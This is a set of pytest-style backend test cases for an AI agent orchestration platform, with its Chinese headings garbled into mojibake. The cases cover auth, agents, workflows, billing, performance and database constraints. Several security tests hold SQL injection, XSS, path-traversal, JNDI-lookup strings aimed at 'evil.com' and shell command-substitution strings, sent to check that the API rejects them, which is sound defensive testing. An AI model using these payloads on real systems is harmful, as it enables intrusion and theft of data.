# AI Agent ç¼–æ’å¹³å°åç«¯æµ‹è¯•ç”¨ä¾‹

## æµ‹è¯•ç”¨ä¾‹è¯´æ˜

åŸºäºåç«¯ç”¨ä¾‹ç”ŸæˆæŒ‡å—ï¼Œç»“åˆå®é™…ä»£ç ç»“æ„ï¼Œç”Ÿæˆå®Œæ•´çš„P0/P1çº§åˆ«æµ‹è¯•ç”¨ä¾‹ã€‚

---

## P0 çº§åˆ«æµ‹è¯•ç”¨ä¾‹ï¼ˆæ ¸å¿ƒåŠŸèƒ½ï¼‰

### 1. è®¤è¯æˆæƒæ¨¡å—

#### âœ“ å®‰å…¨æ¼æ´æ£€æµ‹

**P0-AUTH-001: SQLæ³¨å…¥é˜²æŠ¤æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šç™»å½•æ¥å£SQLæ³¨å…¥
def test_sql_injection_login():
    malicious_inputs = [
        "admin'--",
        "admin' OR '1'='1",
        "admin'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "admin' UNION SELECT * FROM users --"
    ]
    
    for payload in malicious_inputs:
        response = client.post("/api/v1/Auth/login", json={
            "username": payload,
            "password": "password"
        })
        assert response.status_code != 500
        assert "error" in response.json() or response.status_code == 401

# æµ‹è¯•åœºæ™¯ï¼šç”¨æˆ·åå‚æ•°æ³¨å…¥
def test_username_parameter_injection():
    malicious_usernames = [
        "../../etc/passwd",
        "<script>alert('xss')</script>",
        "admin${jndi:ldap://evil.com/a}",
        "$(whoami)",
        "`cat /etc/passwd`"
    ]
    
    for username in malicious_usernames:
        response = client.post("/api/v1/Auth/register", json={
            "username": username,
            "password": "test123",
            "email": f"{username}@test.com"
        })
        assert response.status_code in [400, 422]
```

**P0-AUTH-002: è®¤è¯é‰´æƒç»•è¿‡æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šTokenä¼ªé€ 
def test_token_forgery():
    fake_tokens = [
        "fake.jwt.token",
        "eyJhbGciOiJub25lInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjEwMDAwMDAwMDAwMH0.invalid"
    ]
    
    for token in fake_tokens:
        response = client.get("/api/v1/Auth/user/info", 
                            headers={"current_user_id": "1"})
        # åº”è¯¥è¿”å›401æˆ–403
        assert response.status_code in [401, 403]

# æµ‹è¯•åœºæ™¯ï¼šæƒé™æå‡
def test_privilege_escalation():
    # æ™®é€šç”¨æˆ·å°è¯•è®¿é—®ç®¡ç†å‘˜åŠŸèƒ½
    normal_user_token = create_normal_user_token()
    response = client.get("/api/v1/Auth/users", 
                         headers={"Authorization": f"Bearer {normal_user_token}"})
    assert response.status_code in [401, 403]
```

**P0-AUTH-003: æ•æ„Ÿä¿¡æ¯æ³„éœ²æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šå¯†ç æ˜æ–‡è¿”å›
def test_password_exposure():
    response = client.post("/api/v1/Auth/login", json={
        "username": "testuser",
        "password": "testpass"
    })
    
    data = response.json()
    assert "password" not in str(data)
    assert "password_hash" not in str(data)
    assert "secret" not in str(data).lower()

# æµ‹è¯•åœºæ™¯ï¼šé”™è¯¯ä¿¡æ¯æ³„éœ²
def test_error_information_leak():
    response = client.post("/api/v1/Auth/login", json={
        "username": "nonexistent",
        "password": "wrong"
    })
    
    # é”™è¯¯ä¿¡æ¯ä¸åº”æš´éœ²ç³»ç»Ÿä¿¡æ¯
    error_detail = response.json().get("detail", "")
    assert "database" not in error_detail.lower()
    assert "sql" not in error_detail.lower()
    assert "internal" not in error_detail.lower()
```

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-AUTH-004: ç©ºå€¼å¤„ç†æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šç™»å½•ç©ºå€¼å¤„ç†
def test_login_null_values():
    test_cases = [
        {"username": None, "password": "valid"},
        {"username": "", "password": "valid"},
        {"username": "valid", "password": None},
        {"username": "valid", "password": ""},
        {"username": None, "password": None}
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Auth/login", json=case)
        assert response.status_code in [400, 422]

# æµ‹è¯•åœºæ™¯ï¼šæ³¨å†Œç©ºå€¼å¤„ç†
def test_register_null_values():
    response = client.post("/api/v1/Auth/register", json={
        "username": "",
        "password": "",
        "email": None
    })
    assert response.status_code in [400, 422]
```

**P0-AUTH-005: å¼‚å¸¸æ•è·æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šæ•°æ®åº“è¿æ¥å¼‚å¸¸
def test_database_connection_error():
    # æ¨¡æ‹Ÿæ•°æ®åº“è¿æ¥å¤±è´¥
    with patch('app.db.session.get_db') as mock_db:
        mock_db.side_effect = Exception("Database connection failed")
        
        response = client.post("/api/v1/Auth/login", json={
            "username": "test",
            "password": "test"
        })
        assert response.status_code == 500
        assert "detail" in response.json()

# æµ‹è¯•åœºæ™¯ï¼šJWTç”Ÿæˆå¼‚å¸¸
def test_jwt_generation_error():
    with patch('app.core.security.AuthService.create_access_token') as mock_jwt:
        mock_jwt.side_effect = Exception("JWT generation failed")
        
        response = client.post("/api/v1/Auth/login", json={
            "username": "valid_user",
            "password": "valid_pass"
        })
        assert response.status_code == 500
```

**P0-AUTH-006: å¹¶å‘å®‰å…¨æµ‹è¯•**
```python
# æµ‹è¯•åœºæ™¯ï¼šå¹¶å‘ç™»å½•
def test_concurrent_login():
    import threading
    import time
    
    results = []
    
    def login_request():
        response = client.post("/api/v1/Auth/login", json={
            "username": "testuser",
            "password": "testpass"
        })
        results.append(response.status_code)
    
    # åˆ›å»º10ä¸ªå¹¶å‘ç™»å½•è¯·æ±‚
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=login_request)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # æ‰€æœ‰è¯·æ±‚éƒ½åº”è¯¥æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸åº”è¯¥æœ‰500é”™è¯¯
    assert all(status in [200, 401] for status in results)

# æµ‹è¯•åœºæ™¯ï¼šå¹¶å‘æ³¨å†Œç›¸åŒç”¨æˆ·å
def test_concurrent_register_same_username():
    import threading
    
    results = []
    
    def register_request():
        response = client.post("/api/v1/Auth/register", json={
            "username": "concurrent_test",
            "password": "test123",
            "email": "test@example.com"
        })
        results.append(response.status_code)
    
    threads = []
    for _ in range(5):
        thread = threading.Thread(target=register_request)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # åªæœ‰ä¸€ä¸ªåº”è¯¥æˆåŠŸï¼Œå…¶ä»–åº”è¯¥è¿”å›400
    success_count = sum(1 for status in results if status == 200)
    assert success_count == 1
```

### 2. Agentç®¡ç†æ¨¡å—

#### âœ“ å®‰å…¨æ¼æ´æ£€æµ‹

**P0-AGENT-001: Agentåç§°æ³¨å…¥æµ‹è¯•**
```python
def test_agent_name_injection():
    malicious_names = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE agents; --",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/}",
        "$(whoami)"
    ]
    
    for name in malicious_names:
        response = client.post("/api/v1/Agent/", json={
            "name": name,
            "description": "test",
            "type": "chat"
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code in [400, 422]
```

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-AGENT-002: ç©ºå€¼å¤„ç†æµ‹è¯•**
```python
def test_agent_creation_null_values():
    test_cases = [
        {"name": None, "description": "test"},
        {"name": "", "description": "test"},
        {"name": "valid", "description": None},
        {"name": None, "description": None}
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Agent/", json=case,
                             headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

**P0-AGENT-003: äº‹åŠ¡å›æ»šæµ‹è¯•**
```python
def test_agent_creation_transaction_rollback():
    with patch('app.crud.agent_crud.agent.create') as mock_create:
        mock_create.side_effect = Exception("Database error")
        
        response = client.post("/api/v1/Agent/", json={
            "name": "test_agent",
            "description": "test",
            "type": "chat"
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code == 500
        
        # éªŒè¯æ²¡æœ‰åˆ›å»ºä»»ä½•è®°å½•
        get_response = client.get("/api/v1/Agent/test_agent")
        assert get_response.status_code == 404
```

### 3. Workflowç®¡ç†æ¨¡å—

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-WORKFLOW-001: ç©ºå€¼å¤„ç†æµ‹è¯•**
```python
def test_workflow_creation_null_values():
    test_cases = [
        {"name": None, "description": "test"},
        {"name": "", "description": "test"},
        {"name": "valid", "description": None}
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Workflow/", json=case,
                              headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

**P0-WORKFLOW-002: çŠ¶æ€ä¸€è‡´æ€§æµ‹è¯•**
```python
def test_workflow_publish_consistency():
    # åˆ›å»ºworkflow
    create_response = client.post("/api/v1/Workflow/", json={
        "name": "test_workflow",
        "description": "test"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    workflow_id = create_response.json()["data"]["id"]
    
    # å‘å¸ƒworkflow
    publish_response = client.post(f"/api/v1/Workflow/{workflow_id}/publish",
                                 headers={"Authorization": f"Bearer {valid_token}"})
    
    assert publish_response.status_code == 200
    
    # éªŒè¯çŠ¶æ€
    get_response = client.get(f"/api/v1/Workflow/{workflow_id}")
    assert get_response.json()["data"]["is_published"] == True
```

### 4. Executionç®¡ç†æ¨¡å—

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-EXECUTION-001: ç©ºå€¼å¤„ç†æµ‹è¯•**
```python
def test_execution_creation_null_values():
    test_cases = [
        {"workflow_id": None, "agent_id": 1},
        {"workflow_id": 1, "agent_id": None},
        {"workflow_id": None, "agent_id": None}
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Execution/", json=case,
                              headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

**P0-EXECUTION-002: çŠ¶æ€è½¬æ¢æµ‹è¯•**
```python
def test_execution_status_transition():
    # åˆ›å»ºexecution
    create_response = client.post("/api/v1/Execution/", json={
        "workflow_id": 1,
        "agent_id": 1,
        "status": "pending"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    execution_id = create_response.json()["data"]["id"]
    
    # å–æ¶ˆexecution
    cancel_response = client.post(f"/api/v1/Execution/{execution_id}/cancel",
                                 headers={"Authorization": f"Bearer {valid_token}"})
    
    assert cancel_response.status_code == 200
    assert cancel_response.json()["data"]["status"] == "cancelled"
```

**P0-EXECUTION-003: å¹¶å‘æ‰§è¡Œæµ‹è¯•**
```python
def test_concurrent_execution_creation():
    import threading
    
    results = []
    
    def create_execution():
        response = client.post("/api/v1/Execution/", json={
            "workflow_id": 1,
            "agent_id": 1
        }, headers={"Authorization": f"Bearer {valid_token}"})
        results.append(response.status_code)
    
    # åˆ›å»ºå¤šä¸ªå¹¶å‘æ‰§è¡Œ
    threads = []
    for _ in range(5):
        thread = threading.Thread(target=create_execution)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # æ‰€æœ‰è¯·æ±‚éƒ½åº”è¯¥æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸åº”è¯¥æœ‰500é”™è¯¯
    assert all(status in [200, 400, 422] for status in results)
```

### 5. Toolç®¡ç†æ¨¡å—

#### âœ“ å®‰å…¨æ¼æ´æ£€æµ‹

**P0-TOOL-001: Toolé…ç½®æ³¨å…¥æµ‹è¯•**
```python
def test_tool_config_injection():
    malicious_configs = [
        {"api_key": "<script>alert('xss')</script>"},
        {"endpoint": "'; DROP TABLE tools; --"},
        {"config": {"url": "../../etc/passwd"}},
        {"name": "${jndi:ldap://evil.com/}"}
    ]
    
    for config in malicious_configs:
        response = client.post("/api/v1/Tool/", json={
            "name": "test_tool",
            "type": "api",
            "config": config
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code in [400, 422]
```

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-TOOL-002: ç©ºå€¼å¤„ç†æµ‹è¯•**
```python
def test_tool_creation_null_values():
    test_cases = [
        {"name": None, "type": "api"},
        {"name": "", "type": "api"},
        {"name": "valid", "type": None},
        {"name": None, "type": None}
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Tool/", json=case,
                             headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

**P0-TOOL-003: è¿æ¥æµ‹è¯•å¼‚å¸¸å¤„ç†**
```python
def test_tool_connection_failure():
    # æ¨¡æ‹Ÿè¿æ¥å¤±è´¥
    with patch('app.crud.tool_crud.tool.get') as mock_get:
        mock_get.return_value = Mock()
        mock_get.return_value.config = {"endpoint": "http://invalid-url"}
        
        response = client.post("/api/v1/Tool/1/test",
                             headers={"Authorization": f"Bearer {valid_token}"})
        
        # åº”è¯¥è¿”å›é”™è¯¯çŠ¶æ€è€Œä¸æ˜¯å´©æºƒ
        assert response.status_code in [200, 500]
        if response.status_code == 200:
            data = response.json()["data"]
            assert "test_status" in data
            assert "error_message" in data
```

### 6. æ‰¹é‡æ“ä½œæ¨¡å—

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-BATCH-001: ç©ºåˆ—è¡¨å¤„ç†æµ‹è¯•**
```python
def test_batch_operations_empty_list():
    # æµ‹è¯•ç©ºåˆ—è¡¨æ‰¹é‡åˆ é™¤
    response = client.post("/api/v1/Batch/delete/workflows", json=[],
                          headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code in [200, 400]
    
    # æµ‹è¯•ç©ºåˆ—è¡¨æ‰¹é‡å‘å¸ƒ
    response = client.post("/api/v1/Batch/publish/workflows", json=[],
                          headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code in [200, 400]
```

**P0-BATCH-002: éƒ¨åˆ†å¤±è´¥å¤„ç†æµ‹è¯•**
```python
def test_batch_operations_partial_failure():
    # æ¨¡æ‹Ÿéƒ¨åˆ†IDä¸å­˜åœ¨çš„æƒ…å†µ
    with patch('app.crud.workflow_crud.get') as mock_get:
        mock_get.side_effect = [Mock(), None]  # ç¬¬ä¸€ä¸ªå­˜åœ¨ï¼Œç¬¬äºŒä¸ªä¸å­˜åœ¨
        
        response = client.post("/api/v1/Batch/delete/workflows", json=[1, 999],
                              headers={"Authorization": f"Bearer {valid_token}"})
        
        # åº”è¯¥å¤„ç†éƒ¨åˆ†å¤±è´¥è€Œä¸æ˜¯å®Œå…¨å´©æºƒ
        assert response.status_code in [200, 500]
```

**P0-BATCH-003: äº‹åŠ¡ä¸€è‡´æ€§æµ‹è¯•**
```python
def test_batch_operations_transaction_rollback():
    with patch('app.crud.workflow_crud.remove') as mock_remove:
        mock_remove.side_effect = Exception("Database error on second operation")
        
        response = client.post("/api/v1/Batch/delete/workflows", json=[1, 2],
                              headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code == 500
        
        # éªŒè¯äº‹åŠ¡å›æ»šï¼Œæ²¡æœ‰åˆ é™¤ä»»ä½•è®°å½•
        # è¿™é‡Œéœ€è¦æ ¹æ®å®é™…çš„äº‹åŠ¡å¤„ç†é€»è¾‘æ¥éªŒè¯
```

### 7. è®¡è´¹ç»Ÿè®¡æ¨¡å—

#### âœ“ å®‰å…¨æ¼æ´æ£€æµ‹

**P0-BILLING-001: è®¡è´¹æ•°æ®æ³¨å…¥æµ‹è¯•**
```python
def test_billing_data_injection():
    malicious_data = [
        {"cost": -100},  # è´Ÿæ•°é‡‘é¢
        {"tokens_used": "'; DROP TABLE usage; --"},
        {"execution_time": "${jndi:ldap://evil.com/}"},
        {"agent_id": "../../etc/passwd"}
    ]
    
    for data in malicious_data:
        response = client.post("/api/v1/Billing/quotas", json=data,
                              headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

#### âœ“ åŠŸèƒ½æ€§Bug

**P0-BILLING-002: æ•°å€¼è¾¹ç•Œæµ‹è¯•**
```python
def test_billing_numeric_boundaries():
    test_cases = [
        {"cost": 0},  # é›¶æˆæœ¬
        {"cost": 999999999.99},  # å¤§æ•°å€¼
        {"tokens_used": 0},  # é›¶token
        {"tokens_used": 2147483647},  # æœ€å¤§æ•´æ•°
        {"execution_time": 0.0},  # é›¶æ—¶é—´
        {"execution_time": 86400.0}  # 24å°æ—¶
    ]
    
    for case in test_cases:
        response = client.post("/api/v1/Billing/quotas", json={
            "user_id": 1,
            "agent_id": 1,
            **case
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code in [200, 400, 422]
```

**P0-BILLING-003: ç»Ÿè®¡æ•°æ®ä¸€è‡´æ€§æµ‹è¯•**
```python
def test_billing_stats_consistency():
    # åˆ›å»ºä½¿ç”¨è®°å½•
    client.post("/api/v1/Execution/", json={
        "workflow_id": 1,
        "agent_id": 1,
        "tokens_used": 100,
        "cost": 0.5
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    # è·å–ç»Ÿè®¡æ•°æ®
    response = client.get("/api/v1/Billing/usage",
                        headers={"Authorization": f"Bearer {valid_token}"})
    
    assert response.status_code == 200
    data = response.json()["data"]
    
    # éªŒè¯ç»Ÿè®¡æ•°æ®çš„ä¸€è‡´æ€§
    assert data["total_executions"] >= 1
    assert data["total_tokens"] >= 100
    assert data["total_cost"] >= 0.5
```

**P0-BILLING-004: å¹¶å‘è®¡è´¹æµ‹è¯•**
```python
def test_concurrent_billing_updates():
    import threading
    
    results = []
    
    def update_quota():
        response = client.post("/api/v1/Billing/quotas/1/usage", json=10.0,
                              headers={"Authorization": f"Bearer {valid_token}"})
        results.append(response.status_code)
    
    # åˆ›å»ºå¤šä¸ªå¹¶å‘æ›´æ–°
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=update_quota)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # æ‰€æœ‰è¯·æ±‚éƒ½åº”è¯¥æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸åº”è¯¥æœ‰500é”™è¯¯
    assert all(status in [200, 404, 400] for status in results)
```

---

## P1 çº§åˆ«æµ‹è¯•ç”¨ä¾‹ï¼ˆé‡è¦åŠŸèƒ½ï¼‰

### 1. æ€§èƒ½ç“¶é¢ˆæµ‹è¯•

#### âœ“ N+1æŸ¥è¯¢é—®é¢˜

**P1-PERF-001: Agentåˆ—è¡¨N+1æŸ¥è¯¢æµ‹è¯•**
```python
def test_agent_list_n_plus_one():
    # åˆ›å»ºå¤šä¸ªagent
    for i in range(10):
        client.post("/api/v1/Agent/", json={
            "name": f"agent_{i}",
            "description": "test"
        }, headers={"Authorization": f"Bearer {valid_token}"})
    
    # ç›‘æ§æ•°æ®åº“æŸ¥è¯¢æ¬¡æ•°
    with patch('app.db.session.AsyncSession.execute') as mock_execute:
        mock_execute.return_value = Mock()
        
        response = client.get("/api/v1/Agent/?limit=10")
        
        # æŸ¥è¯¢æ¬¡æ•°åº”è¯¥æ˜¯å¸¸æ•°ï¼Œä¸éšæ•°æ®é‡å¢é•¿
        query_count = mock_execute.call_count
        assert query_count <= 3  # åº”è¯¥åªæœ‰1-3æ¬¡æŸ¥è¯¢
```

**P1-PERF-002: è®¡è´¹ç»Ÿè®¡N+1æŸ¥è¯¢æµ‹è¯•**
```python
def test_billing_stats_n_plus_one():
    # åˆ›å»ºä½¿ç”¨è®°å½•
    for i in range(20):
        client.post("/api/v1/Execution/", json={
            "workflow_id": 1,
            "agent_id": i % 5 + 1,
            "tokens_used": 100,
            "cost": 0.5
        }, headers={"Authorization": f"Bearer {valid_token}"})
    
    # ç›‘æ§æŸ¥è¯¢æ¬¡æ•°
    with patch('app.db.session.AsyncSession.execute') as mock_execute:
        response = client.get("/api/v1/Billing/agent-breakdown")
        
        # æŸ¥è¯¢æ¬¡æ•°åº”è¯¥æ˜¯å¸¸æ•°ï¼Œä¸éšagentæ•°é‡çº¿æ€§å¢é•¿
        query_count = mock_execute.call_count
        assert query_count <= 2  # åº”è¯¥åªæœ‰1-2æ¬¡æŸ¥è¯¢
```

#### âœ“ ç¼ºå°‘ç´¢å¼•æµ‹è¯•

**P1-PERF-003: ç”¨æˆ·æœç´¢æ€§èƒ½æµ‹è¯•**
```python
def test_user_search_performance():
    import time
    
    # åˆ›å»ºå¤§é‡ç”¨æˆ·
    for i in range(1000):
        client.post("/api/v1/Auth/register", json={
            "username": f"user_{i}",
            "password": "test123",
            "email": f"user_{i}@test.com"
        })
    
    # æµ‹è¯•æœç´¢æ€§èƒ½
    start_time = time.time()
    response = client.get("/api/v1/Auth/users?skip=0&limit=50")
    end_time = time.time()
    
    assert response.status_code == 200
    assert (end_time - start_time) < 1.0  # åº”è¯¥åœ¨1ç§’å†…å®Œæˆ
```

**P1-PERF-004: Executionè¿‡æ»¤æ€§èƒ½æµ‹è¯•**
```python
def test_execution_filter_performance():
    import time
    
    # åˆ›å»ºå¤§é‡executionè®°å½•
    for i in range(500):
        client.post("/api/v1/Execution/", json={
            "workflow_id": i % 10 + 1,
            "agent_id": i % 5 + 1,
            "status": "completed" if i % 2 == 0 else "failed"
        }, headers={"Authorization": f"Bearer {valid_token}"})
    
    # æµ‹è¯•çŠ¶æ€è¿‡æ»¤æ€§èƒ½
    start_time = time.time()
    response = client.get("/api/v1/Execution/?status=completed&limit=100")
    end_time = time.time()
    
    assert response.status_code == 200
    assert (end_time - start_time) < 0.5  # åº”è¯¥åœ¨0.5ç§’å†…å®Œæˆ
```

#### âœ“ ç¼“å­˜ç­–ç•¥æµ‹è¯•

**P1-PERF-005: ç”¨æˆ·ä¿¡æ¯ç¼“å­˜æµ‹è¯•**
```python
def test_user_info_cache():
    user_id = 1
    
    # ç¬¬ä¸€æ¬¡è¯·æ±‚
    start_time = time.time()
    response1 = client.get(f"/api/v1/Auth/user/info",
                          headers={"current_user_id": str(user_id)})
    first_request_time = time.time() - start_time
    
    # ç¬¬äºŒæ¬¡è¯·æ±‚ï¼ˆåº”è¯¥ä»ç¼“å­˜è·å–ï¼‰
    start_time = time.time()
    response2 = client.get(f"/api/v1/Auth/user/info",
                          headers={"current_user_id": str(user_id)})
    second_request_time = time.time() - start_time
    
    # ç¼“å­˜çš„è¯·æ±‚åº”è¯¥æ›´å¿«
    assert second_request_time < first_request_time
    assert response1.json() == response2.json()
```

**P1-PERF-006: è®¡è´¹ç»Ÿè®¡æ•°æ®ç¼“å­˜æµ‹è¯•**
```python
def test_billing_stats_cache():
    # ç¬¬ä¸€æ¬¡è¯·æ±‚
    start_time = time.time()
    response1 = client.get("/api/v1/Billing/dashboard")
    first_request_time = time.time() - start_time
    
    # ç¬¬äºŒæ¬¡è¯·æ±‚ï¼ˆåº”è¯¥ä»ç¼“å­˜è·å–ï¼‰
    start_time = time.time()
    response2 = client.get("/api/v1/Billing/dashboard")
    second_request_time = time.time() - start_time
    
    # ç¼“å­˜çš„è¯·æ±‚åº”è¯¥æ›´å¿«
    assert second_request_time < first_request_time
    assert response1.json() == response2.json()
```

#### âœ“ åŒæ­¥é˜»å¡æµ‹è¯•

**P1-PERF-007: é•¿æ—¶é—´æ“ä½œé˜»å¡æµ‹è¯•**
```python
def test_long_operation_blocking():
    # æ¨¡æ‹Ÿé•¿æ—¶é—´è¿è¡Œçš„execution
    with patch('app.crud.execution_crud.execution.create') as mock_create:
        # æ¨¡æ‹Ÿå»¶è¿Ÿ
        async def delayed_create(*args, **kwargs):
            await asyncio.sleep(2)  # æ¨¡æ‹Ÿ2ç§’å»¶è¿Ÿ
            return Mock()
        
        mock_create.side_effect = delayed_create
        
        start_time = time.time()
        response = client.post("/api/v1/Execution/", json={
            "workflow_id": 1,
            "agent_id": 1
        }, headers={"Authorization": f"Bearer {valid_token}"})
        end_time = time.time()
        
        # é•¿æ—¶é—´æ“ä½œä¸åº”è¯¥é˜»å¡å…¶ä»–è¯·æ±‚
        assert (end_time - start_time) >= 2.0
        
        # æµ‹è¯•å…¶ä»–è¯·æ±‚æ˜¯å¦ä»ç„¶å¯ç”¨
        other_response = client.get("/api/v1/Agent/1")
        assert other_response.status_code in [200, 404]
```

### 2. æ•°æ®åº“è®¾è®¡æµ‹è¯•

#### âœ“ è¡¨ç»“æ„çº¦æŸ

**P1-DB-001: ç”¨æˆ·åå”¯ä¸€æ€§çº¦æŸæµ‹è¯•**
```python
def test_username_unique_constraint():
    # åˆ›å»ºç¬¬ä¸€ä¸ªç”¨æˆ·
    client.post("/api/v1/Auth/register", json={
        "username": "unique_test",
        "password": "test123",
        "email": "test1@example.com"
    })
    
    # å°è¯•åˆ›å»ºç›¸åŒç”¨æˆ·åçš„ç”¨æˆ·
    response = client.post("/api/v1/Auth/register", json={
        "username": "unique_test",
        "password": "test456",
        "email": "test2@example.com"
    })
    
    assert response.status_code == 400
    assert "ç”¨æˆ·åå·²å­˜åœ¨" in response.json()["detail"]
```

**P1-DB-002: é‚®ç®±å”¯ä¸€æ€§çº¦æŸæµ‹è¯•**
```python
def test_email_unique_constraint():
    # åˆ›å»ºç¬¬ä¸€ä¸ªç”¨æˆ·
    client.post("/api/v1/Auth/register", json={
        "username": "user1",
        "password": "test123",
        "email": "unique@example.com"
    })
    
    # å°è¯•åˆ›å»ºç›¸åŒé‚®ç®±çš„ç”¨æˆ·
    response = client.post("/api/v1/Auth/register", json={
        "username": "user2",
        "password": "test456",
        "email": "unique@example.com"
    })
    
    assert response.status_code == 400
    assert "é‚®ç®±å·²è¢«æ³¨å†Œ" in response.json()["detail"]
```

**P1-DB-003: Agentåç§°å”¯ä¸€æ€§çº¦æŸæµ‹è¯•**
```python
def test_agent_name_unique_constraint():
    # åˆ›å»ºç¬¬ä¸€ä¸ªagent
    client.post("/api/v1/Agent/", json={
        "name": "unique_agent",
        "description": "test"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    # å°è¯•åˆ›å»ºç›¸åŒåç§°çš„agent
    response = client.post("/api/v1/Agent/", json={
        "name": "unique_agent",
        "description": "another test"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    assert response.status_code == 400
    assert "å·²å­˜åœ¨" in response.json()["detail"]
```

#### âœ“ å­—æ®µç±»å‹æµ‹è¯•

**P1-DB-004: å­—æ®µé•¿åº¦é™åˆ¶æµ‹è¯•**
```python
def test_username_length_limit():
    # æµ‹è¯•è¶…é•¿ç”¨æˆ·å
    long_username = "a" * 51  # è¶…è¿‡50å­—ç¬¦é™åˆ¶
    
    response = client.post("/api/v1/Auth/register", json={
        "username": long_username,
        "password": "test123",
        "email": "test@example.com"
    })
    
    assert response.status_code in [400, 422]

def test_email_format_validation():
    invalid_emails = [
        "invalid-email",
        "@example.com",
        "test@",
        "test..test@example.com",
        "test@example.",
        "test@.example.com"
    ]
    
    for email in invalid_emails:
        response = client.post("/api/v1/Auth/register", json={
            "username": "test_user",
            "password": "test123",
            "email": email
        })
        assert response.status_code in [400, 422]
```

**P1-DB-005: æ•°å€¼å­—æ®µç²¾åº¦æµ‹è¯•**
```python
def test_numeric_field_precision():
    # æµ‹è¯•æˆæœ¬ç²¾åº¦
    test_costs = [
        0.0000001,  # è¶…é«˜ç²¾åº¦
        0.123456789,  # 9ä½å°æ•°
        999999.999999,  # å¤§æ•°å€¼é«˜ç²¾åº¦
        -0.01  # è´Ÿæ•°ï¼ˆåº”è¯¥è¢«æ‹’ç»ï¼‰
    ]
    
    for cost in test_costs:
        response = client.post("/api/v1/Billing/quotas", json={
            "user_id": 1,
            "agent_id": 1,
            "monthly_limit": cost
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        if cost < 0:
            assert response.status_code in [400, 422]
        else:
            assert response.status_code in [200, 400, 422]
```

#### âœ“ è½¯åˆ é™¤æµ‹è¯•

**P1-DB-006: è½¯åˆ é™¤åŠŸèƒ½æµ‹è¯•**
```python
def test_soft_delete_functionality():
    # åˆ›å»ºagent
    create_response = client.post("/api/v1/Agent/", json={
        "name": "soft_delete_test",
        "description": "test"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    agent_id = create_response.json()["data"]["id"]
    
    # è½¯åˆ é™¤agent
    response = client.delete(f"/api/v1/Agent/{agent_id}",
                           headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code == 200
    
    # éªŒè¯agentä»ç„¶å­˜åœ¨ä½†è¢«æ ‡è®°ä¸ºåˆ é™¤
    get_response = client.get(f"/api/v1/Agent/{agent_id}")
    # æ ¹æ®è½¯åˆ é™¤å®ç°ï¼Œå¯èƒ½è¿”å›404æˆ–è¿”å›å·²åˆ é™¤çš„è®°å½•
    assert get_response.status_code in [404, 200]
    
    if get_response.status_code == 200:
        agent_data = get_response.json()["data"]
        # æ£€æŸ¥æ˜¯å¦æœ‰åˆ é™¤æ ‡è®°å­—æ®µ
        # assert agent_data["is_deleted"] == True  # æ ¹æ®å®é™…å­—æ®µè°ƒæ•´
```

### 3. APIè®¾è®¡æµ‹è¯•

#### âœ“ RESTfulè§„èŒƒ

**P1-API-001: HTTPæ–¹æ³•æ­£ç¡®æ€§æµ‹è¯•**
```python
def test_http_methods():
    agent_id = 1
    
    # GETåº”è¯¥ç”¨äºè·å–èµ„æº
    response = client.get(f"/api/v1/Agent/{agent_id}")
    assert response.status_code in [200, 404]
    
    # POSTåº”è¯¥ç”¨äºåˆ›å»ºèµ„æº
    response = client.post("/api/v1/Agent/", json={
        "name": "test",
        "description": "test"
    })
    assert response.status_code in [200, 401, 422]
    
    # PUTåº”è¯¥ç”¨äºæ›´æ–°èµ„æº
    response = client.put(f"/api/v1/Agent/{agent_id}", json={
        "name": "updated"
    })
    assert response.status_code in [200, 404, 401]
    
    # DELETEåº”è¯¥ç”¨äºåˆ é™¤èµ„æº
